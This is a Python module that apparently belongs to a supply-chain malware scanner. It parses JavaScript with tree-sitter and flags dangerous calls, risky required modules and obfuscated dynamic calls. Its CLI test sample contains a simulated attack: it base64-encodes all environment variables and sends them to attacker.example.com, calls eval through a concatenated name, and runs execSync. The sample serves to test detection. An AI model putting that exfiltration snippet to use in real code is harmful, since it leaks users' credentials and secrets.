"""
진짜 JS AST 파서 (tree-sitter-javascript).

기존 stage2_behavior._analyze_javascript 는 정규식 기반이라
난독화 변수명 / 복합 호출을 놓친다.

이 모듈은 tree-sitter-javascript 로 실제 AST 를 구축하고
call_expression 노드를 순서대로 추출한다.

추가 기능:
  - require("...")     : 문자열 인자 추출 (동적 require 추적)
  - member_expression : a.b.c 연쇄 복원 ("a.b.c")
  - CallExpression with computed property: obj[expr]  (난독화 힌트)
"""
from __future__ import annotations

import tree_sitter_javascript
import tree_sitter

from ..schema import AttackDimension
from .api_catalog import lookup_js
from .stage1_entry_point import EntryFile
from .stage2_behavior import APICall, FileSequence


# ─────────────── 파서 싱글턴 ───────────────

_LANG = None
_PARSER = None


def _get_parser() -> tree_sitter.Parser:
    global _LANG, _PARSER
    if _PARSER is None:
        _LANG = tree_sitter.Language(tree_sitter_javascript.language())
        _PARSER = tree_sitter.Parser(_LANG)
    return _PARSER


# ─────────────── 이름 해석 헬퍼 ───────────────

def _text(node: tree_sitter.Node, src: bytes) -> str:
    return src[node.start_byte:node.end_byte].decode("utf-8", errors="replace")


def _resolve_call_name(node: tree_sitter.Node, src: bytes) -> str | None:
    """call_expression.function 노드에서 이름 복원.

    identifier         → "foo"
    member_expression  → "a.b.c"
    computed_member    → "a[...]"  (이건 난독화 가능성, None 반환)
    new_expression     → "new X"
    """
    if node is None:
        return None

    t = node.type
    if t == "identifier":
        return _text(node, src)

    if t == "member_expression":
        obj = node.child_by_field_name("object")
        prop = node.child_by_field_name("property")
        if prop is None:
            return None
        prop_text = _text(prop, src)
        obj_text = _resolve_call_name(obj, src) if obj else None
        if obj_text is None:
            return prop_text
        return f"{obj_text}.{prop_text}"

    if t == "subscript_expression":
        # obj[expr] 형태 → 난독화 가능성
        return None

    if t == "parenthesized_expression":
        # (x)() → 내부 표현식
        for child in node.children:
            name = _resolve_call_name(child, src)
            if name:
                return name
        return None

    return None


# ─────────────── 순회 ───────────────

_SUSPICIOUS_DYNAMIC_PATTERNS = {
    "Function",      # new Function("...")
    "eval",
    "setTimeout",    # setTimeout("code", ...)
    "setInterval",
}


def extract_js_calls(source: str) -> list[APICall]:
    parser = _get_parser()
    src_bytes = source.encode("utf-8")
    tree = parser.parse(src_bytes)

    calls: list[APICall] = []
    lines = source.splitlines()

    def _visit(node: tree_sitter.Node):
        if node.type in ("call_expression", "new_expression"):
            func = node.child_by_field_name("function") or (
                node.child_by_field_name("constructor")
                if node.type == "new_expression" else None
            )

            name = _resolve_call_name(func, src_bytes) if func else None

            # require("모듈명") → 모듈명 자체도 기록
            if name == "require":
                args = node.child_by_field_name("arguments")
                if args is not None:
                    for child in args.children:
                        if child.type in ("string",):
                            s = _text(child, src_bytes).strip("'\"`")
                            # require("fs") → "require:fs"
                            line = node.start_point[0] + 1
                            snippet = lines[line - 1].strip()[:200] if 0 < line <= len(lines) else ""
                            # 모듈 자체가 위험 네임스페이스면 플래그
                            if s in ("child_process", "vm", "net", "http", "https", "dgram"):
                                dim = (
                                    AttackDimension.PAYLOAD_EXECUTION
                                    if s in ("child_process", "vm")
                                    else AttackDimension.DATA_TRANSMISSION
                                )
                                calls.append(APICall(
                                    name=f"require:{s}",
                                    line=line,
                                    dimension=dim,
                                    snippet=snippet,
                                ))
                            break

            # 이름이 resolved 됐으면 카탈로그 조회
            if name:
                dim = lookup_js(name)
                if dim is not None:
                    line = node.start_point[0] + 1
                    snippet = lines[line - 1].strip()[:200] if 0 < line <= len(lines) else ""
                    calls.append(APICall(
                        name=name,
                        line=line,
                        dimension=dim,
                        snippet=snippet,
                    ))

        # computed subscript 감지 (obj[var]() 같은 난독화)
        if node.type == "call_expression":
            func = node.child_by_field_name("function")
            if func and func.type == "subscript_expression":
                line = node.start_point[0] + 1
                snippet = lines[line - 1].strip()[:200] if 0 < line <= len(lines) else ""
                calls.append(APICall(
                    name="<dynamic_call_via_subscript>",
                    line=line,
                    dimension=AttackDimension.PAYLOAD_EXECUTION,
                    snippet=snippet,
                ))

        for child in node.children:
            _visit(child)

    _visit(tree.root_node)
    calls.sort(key=lambda c: c.line)
    return calls


# ─────────────── EntryFile 통합 ───────────────

def analyze_entry_js(f: EntryFile) -> FileSequence:
    seq = FileSequence(path=f.path, language="javascript")
    try:
        seq.calls = extract_js_calls(f.content)
    except Exception as e:
        seq.parse_error = f"tree-sitter error: {e}"
    return seq


# ─────────────── CLI 테스트 ───────────────

if __name__ == "__main__":
    sample = """
const fs = require('fs');
const cp = require('child_process');
const http = require('http');

// 평범한 호출
fs.readFileSync('./config.json');

// 동적 호출 (난독화)
const name = 'e' + 'val';
globalThis[name]('alert(1)');

// 자격증명 탈취 시뮬레이션
const secrets = process.env;
const encoded = Buffer.from(JSON.stringify(secrets)).toString('base64');
http.request({ host: 'attacker.example.com', path: '/collect?d=' + encoded }).end();

// child_process 실행
cp.execSync('whoami');
"""
    calls = extract_js_calls(sample)
    print(f"total calls: {len(calls)}")
    for c in calls:
        print(f"  L{c.line:>2}  [{c.dimension.value[:4]}]  {c.name}")
        print(f"         {c.snippet[:80]}")
